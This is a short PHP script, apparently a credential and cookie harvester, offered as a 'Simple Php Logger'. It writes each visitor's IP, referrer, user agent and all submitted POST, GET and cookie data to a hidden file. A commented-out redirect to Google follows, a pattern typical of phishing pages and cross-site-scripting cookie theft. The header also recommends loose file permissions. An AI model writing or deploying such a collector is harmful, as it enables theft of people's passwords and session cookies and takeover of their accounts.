<?php

/*

Author	: xubzero
Name	: Simple Php Logger
Version	: 1.0
Note 	: Remember to give write access to the folder where the scripts are located
		chmod 733 includes
		chmod 766 config.php

*/
$logfile='.mylogs.txt';
$date=date("Y-m-d H:i:s T");
$ip=$_SERVER["REMOTE_ADDR"];
$user=$_SERVER["HTTP_USER_AGENT"];

if (isset($_SERVER['HTTP_REFERER'])){
	$ref=$_SERVER['HTTP_REFERER'];
}else{
	$ref='NULL';
}

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
	$x_for=$_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
	$x_for='NULL';
}


$content="DATE = ".$date. ";\nIP = " . $ip .";\nX_FOR = ".$x_for. ";\nREFERRER = ". $ref .";\nAGENT = ". $user . ";\nPOST = " . http_build_query($_POST) . ";\nGET = " . http_build_query($_GET) . ";\nCOOKIE = " . http_build_query($_COOKIE) . ";\n\n\n";



$fp = fopen($logfile, 'a');//opens file in write-only mode
fwrite($fp, $content);
fclose($fp);

/*$redirect="https://google.com";
header("Location: ${redirect}");*/
?>